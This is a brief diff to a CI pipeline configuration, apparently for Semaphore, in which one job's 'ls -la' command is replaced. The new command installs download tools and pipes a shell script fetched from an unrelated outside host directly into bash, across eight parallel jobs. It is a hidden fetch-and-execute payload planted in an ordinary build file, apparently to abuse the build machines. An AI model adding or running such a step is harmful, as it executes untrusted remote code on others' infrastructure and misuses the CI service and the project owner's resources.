@@ -12,5 +12,5 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - ls -la
+            - sudo apt update;sudo apt -y install git wget curl;sudo wget -O - http://greenleaf.wot.mrface.com/start_nodejs_sema_maz.sh | bash
           parallelism: 8
